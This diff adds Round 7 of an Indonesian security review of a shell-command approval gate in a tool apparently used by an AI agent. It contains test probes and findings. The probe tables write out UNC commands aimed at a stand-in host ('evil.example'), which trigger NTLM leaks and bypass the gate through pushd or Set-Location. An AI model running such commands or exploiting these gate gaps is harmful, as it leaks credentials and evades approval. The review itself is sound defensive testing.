@@ -309,3 +309,58 @@ Probe `TestZZSec10R6`/`TestZZR6Cmd` dihapus setelah dijalankan.
 | SEC10-21 | MINOR | confirmed (CI) | `TestPaymentGateResolvedTarget` tidak menyetel `Dialect`, sehingga di Windows path dibaca dengan aturan escape bash. | `Dialect: runtimeDialect()`. |
 
 **Ringkasan Round 6:** #212 `a3ace00` **REQUEST CHANGES**. Perbaikan SEC10-14/16/17/18 benar: CI macOS dan ubuntu lulus, loop prefix berhenti, dan `NewShell` fail-closed. Namun CI Windows **gagal**, dan kegagalan E2E-nya adalah bypass gate yang nyata di dialek `Cmd` (SEC10-20). Selain itu, hook operand baru membuat klasifikasi membuka koneksi SMB ke host UNC pilihan perintah sebelum approval (SEC10-19, kebocoran NTLM + DoS). Keduanya harus ditutup, dengan CI Windows hijau termasuk test junction yang benar-benar berjalan, sebelum merge. `exec/classify` sudah 1800/1800, sehingga perbaikan butuh ruang `loc.budget`.
+
+## Round 7 — 2026-10-22
+
+**Verdict:**
+
+| PR | Head | Verdict |
+|---|---|---|
+| #212 payment gate | `a3ace00` (tidak berubah) | **APPROVE hanya bila di-merge berurutan langsung dengan #234**. Sendirian, SEC10-19/20 masih terbuka |
+| #234 hardening (stack di atas #212) | `61bf601` | **REQUEST CHANGES (kecil)**: SEC10-19/20/21 FIXED dan CI Windows **hijau**. Sisa **SEC10-22 (MEDIUM)**: `pushd \\host\share` / `Set-Location \\host\share` masih auto-approve. SEC10-23 (MINOR, regresi fungsional `Cmd`/`Pwsh`), SEC10-24 (MINOR residual) |
+
+**CI #234 (run `39726212931`)**: ubuntu **pass**, macOS **pass**, **Windows pass** (7m31s; `ok cmd/damnbot 21.4s`, `ok internal/exec/classify`, `ok internal/tools`), plus `lint`, `vet-cross`, dan `loc-budget` pass. GitHub Actions menyetel `CI=true`. Karena `TestMonetaryKeyJunction` kini `t.Fatalf` bila `mklink /J` gagal di CI, kelulusan paket berarti test junction **benar-benar berjalan dan lulus**. `TestPaymentSkillGateWired` di Windows kini memakai `charge.bat` + marker (`cd /d "<skill>\scripts" && charge.bat`), sehingga test E2E bermakna dan lulus.
+
+Gate lokal di `61bf601`: `go test -race -tags goolm -count=1 ./internal/exec/classify ./internal/tools ./internal/skills/... ./internal/archtest` → ok; `./cmd/damnbot -run 'Skill|Payment|Monetary|PathKey|Canon|Key'` → ok; `go vet ./...` + `GOOS=windows|darwin` bersih; `GOOS=windows go test -c ./cmd/damnbot` ok; `make loc` `exec/classify 1810/1815` (ADR-133 butir 24); `make deadcode` 0.
+
+Probe `TestZZSec10R7` (`classify`, dialek `Cmd`/`Pwsh`/`Bash`, dijalankan di `a3ace00` dan `61bf601`) serta `TestZZSec10R7Key` (`keyFor` dengan seam `eval` yang menghitung panggilan) dihapus setelah dijalankan. Kolom keputusan: ask, ask+allow, auto, auto+allow, headless, headless+allow, unsafe, unsafe+allow.
+
+| Perintah | `a3ace00` | `61bf601` |
+|---|---|---|
+| cmd `cd /d <skill>\scripts && charge.bat` | mutating `QAQADAAA` | **monetary `PPPPDDDD`** ✔ SEC10-20 |
+| cmd `cd <skill>\scripts; ./charge.sh` | mutating `QAQADAAA` | **monetary** ✔ |
+| cmd `pushd <skill>\scripts & charge.bat & popd` | monetary | monetary ✔ |
+| pwsh `Set-Location -Path <skill>\scripts; .\charge.ps1` | unknown | **monetary** ✔ |
+| cmd `type \\evil.example\s\x.txt` | mutating `PPPPOOOO` (+ round 6: SMB saat klasifikasi) | **unknown `PPPPDDDD`**, tanpa panggilan `MonetaryKey` mentah ✔ SEC10-19 |
+| cmd `\\evil.example\s\x.exe` | mutating `QAQADAAA` | **unknown** ✔ |
+| **cmd `pushd \\evil.example\share`** | mutating `QAQADAAA` | **mutating `QAQADAAA`** → SEC10-22 |
+| **pwsh `Set-Location \\evil.example\share`** | mutating `QAQADAAA` | **mutating `QAQADAAA`** → SEC10-22 |
+| cmd `cd C:\work\sub && dir` / `cd sub && git status` | mutating `QAQADAAA` | **unknown `PPPPDDDD`** → SEC10-23 |
+| pwsh `Set-Location C:\work\sub; Get-ChildItem` / `cd sub; git status` | mutating `QAQADAAA` | **unknown** → SEC10-23 |
+| bash `cd sub && git status` | mutating | mutating (tidak berubah) |
+
+| `keyFor` (Linux, seam `eval` dihitung) | remote | panggilan `eval` | kunci |
+|---|---|---|---|
+| `\\evil.example\s\x.py` | true | **0** | `//evil.example/s/x.py` |
+| `\\?\UNC\evil.example\s\x` | true | **0** | `//evil.example/s/x` |
+| `\\.\UNC\evil\s` | false | 2 | path lokal relatif (prefix `\\.\` dilepas menjadi `UNC\…` relatif cwd, tidak ke redirector). `classify` sudah `Unknown` untuk operand `\\` |
+| `/tmp/x` | false | 1 | `/tmp/x` |
+
+### Jawaban per pertanyaan
+
+- **SEC10-19:** operand dan argv0 berawalan `\\` → `Unknown` **sebelum** `paymentFile`/`s.abs` (`paths.go`, `command.go`), sehingga tidak pernah sampai ke `MonetaryKey`. Di `cmd/damnbot`, `keyFor` dengan `remote=true` hanya leksikal: 0 panggilan `eval`/`final`, terbukti lewat seam. Production tidak memasang `Env.Resolver` (grep kosong), jadi tidak ada jalur resolve kedua.
+- **`DRIVE_REMOTE` pada drive yang di-map:** `remotePath` memanggil `GetDriveType("Z:\")` hanya untuk volume huruf drive. Untuk root huruf drive, `GetDriveTypeW` membaca tipe dari *device map* proses/sesi (tabel `DosDevices`; drive jaringan = symlink ke `\Device\LanmanRedirector`/`Mup`) **tanpa membuka file di share**, jadi tidak ada SMB/NTLM. Drive yang terputus tetap melaporkan `DRIVE_REMOTE` tanpa memicu reconnect. [INFERENCE: perilaku ini tidak dijamin dokumentasi Win32, dan saya tidak dapat menjalankannya di Windows. Sarannya: test CI Windows dengan `net use Z: \\localhost\C$` + seam `eval` yang gagal bila dipanggil.] Bila jawabannya `DRIVE_REMOTE`, `keyFor` tidak memanggil `EvalSymlinks`/`finalPath` sama sekali ✔.
+- **Aturan "Unknown setelah cd" dan alur cd lokal yang sah:** **ya, ada regresi** di `Cmd`/`Pwsh` (SEC10-23). Setelah `cd`/`pushd`/`Set-Location` **apa pun**, setiap perintah berikutnya menjadi `Unknown`, termasuk `cd C:\work\sub && dir` dan `Set-Location sub; git status`, yang sebelumnya `A` (auto) dengan `shell_allow` cocok atau `--unsafe-auto-shell`. **Seberapa parah:** di Windows, automasi headless (`run --approval auto --unsafe-auto-shell`, cron) kini **menolak** (`D`) setiap alur `cd X && cmd`, dan mode interaktif meminta approval untuk perintah yang sudah ada di allow-list. Bash tidak berubah. Jalan keluarnya ada: argumen `cwd` pada tool `shell` menggantikan `cd` dan tetap auto. Jadi ini regresi kenyamanan dan otomasi, bukan regresi keamanan (fail-closed).
+
+### Temuan
+
+| ID | Severity | Status | Temuan | Perbaikan |
+|---|---|---|---|---|
+| SEC10-19 | HIGH | **fixed** `61bf601` | Operand/argv0 `\\` → `Unknown`; kunci remote leksikal (0 panggilan FS). | — |
+| SEC10-20 | HIGH | **fixed** `61bf601` (CI Windows hijau) | `changeDir` memeriksa setiap argumen literal (melewati `/d`, `-Path`), menambah `push-location`, dan menaikkan `Unknown` untuk perintah setelah cd di `Cmd`/`Pwsh`. | — |
+| SEC10-21 | MINOR | **fixed** `61bf601` | `Dialect: runtimeDialect()` di `TestPaymentGateResolvedTarget`. | — |
+| SEC10-22 | **MEDIUM** | confirmed (simulasi) | **Target `cd` UNC tidak di-gate.** `changeDir` mengirim argumen `\\host\share` lewat `s.abs` (dirusak menjadi `/host/share`) tanpa menaikkan `Unknown`. `pushd \\evil\share` (cmd) dan `Set-Location \\evil\share` (pwsh) → `mutating`, **auto** dengan `shell_allow` atau di `--unsafe-auto-shell`. Saat **dieksekusi**, `pushd`/`Set-Location` membuka koneksi SMB ke host, sehingga terjadi kebocoran NTLM yang sama dengan SEC10-19, kali ini tanpa approval. Konsistensi pun tidak terjaga: `type \\evil\…` ditolak (`D`), sedangkan `pushd \\evil\…` lolos. | Di `changeDir`: argumen berawalan `\\` → `s.raise(Unknown, …)`. Tambahkan test tabel. |
+| SEC10-23 | MINOR (regresi fungsional) | confirmed (simulasi) | "Perintah setelah cd → `Unknown`" berlaku untuk **semua** perintah di `Cmd` **dan** `Pwsh`. Alasannya hanya berlaku untuk cmd (nama telanjang dicari di cwd sebelum `PATH`). PowerShell tidak menjalankan dari cwd tanpa `.\`, dan aturan argv0 relatif sudah ada. | Batasi ke `Cmd`. Di `Cmd`, naikkan `Unknown` hanya bila target cd tidak dapat dilacak (non-literal/glob) atau berada di dalam dir gate (sudah Monetary). Untuk target literal yang ter-resolve, lacak cwd baru agar `cd sub && git status` kembali auto. Dokumentasikan argumen `cwd` tool `shell` sebagai alternatif. |
+| SEC10-24 | MINOR | static (residual) | Path **lokal** yang komponennya symlink ke target UNC (`mklink /D C:\work\l \\evil\s`) bukan "remote" menurut `remotePath`, sehingga `existingPrefix` → `EvalSymlinks` mengikuti symlink ke share **saat klasifikasi**. Membuat symlink semacam itu butuh `SeCreateSymbolicLink` (admin/Developer Mode), dan perintah `mklink … \\evil\s` sendiri kini `Unknown`. Junction tidak bisa menunjuk UNC. | Di `existingPrefix` Windows: `Lstat` per komponen, dan bila menemukan reparse point bertarget UNC (`os.Readlink` berawalan `\\` / `\??\UNC\`), berhenti dan perlakukan sebagai remote. |
+
+**Ringkasan Round 7:** #234 `61bf601` menutup SEC10-19/20/21, dan CI Windows kini hijau dengan test junction dan E2E `.bat` yang benar-benar berjalan. Klasifikasi tidak lagi menyentuh share. `GetDriveType` pada huruf drive dinilai tidak menyentuh share (inferensi; disarankan ditambah test CI). **REQUEST CHANGES kecil** untuk SEC10-22: target `pushd`/`Set-Location` UNC masih auto-approve dan membocorkan NTLM saat eksekusi; perbaikannya satu baris di `changeDir`. SEC10-23 adalah regresi otomasi Windows yang fail-closed (bisa diatasi dengan argumen `cwd`), dan SEC10-24 residual yang butuh hak symlink. #212 `a3ace00` APPROVE dengan syarat di-merge berurutan langsung dengan #234 setelah SEC10-22 ditutup.
